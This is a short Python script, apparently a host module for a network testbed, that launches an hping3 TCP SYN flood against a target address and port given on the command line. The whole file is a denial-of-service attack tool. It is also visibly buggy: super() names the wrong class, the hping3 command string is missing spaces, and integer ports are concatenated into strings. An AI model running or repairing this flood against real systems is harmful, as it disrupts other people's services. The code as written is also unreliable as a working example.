#! /usr/bin/env python

from HostBehaviour import HostModule
import sys
import httplib
import time

import subprocess
import os

class SYNFloodAttacker(HostModule):
	def __init__(self, *args):
		super(HTTPClient, self).__init__(*args)

	def clientBehaviour(self):
		# parse parameters for the target/type of attack etc.

		# HTTP TCP SYN Flood
		bashCommand = "hping3" + self.targetIPAddr + "-I eth2 -q -n -d 110 -S -p " \
			+ self.targetPort + " -s " + self.selfPort + " --flood"

		my_env = os.environ.copy()
		process = subprocess.Popen(bashCommand.split())

		output, error = process.communicate()

if __name__ == '__main__':
	selfIPAddress = sys.argv[1]
	selfPort = int(sys.argv[2])
	targetIPAddress = sys.argv[3]
	targetPort = int(sys.argv[4])
	trafficClass = sys.argv[5]

	# the regular client takes the address and port assigned to it
	# the attacker will also need to include the address and the port it wishes to target

	host = SYNFloodAttacker(selfIPAddress, int(selfPort), targetIPAddress, int(targetPort), trafficClass)
	host.clientExecute()
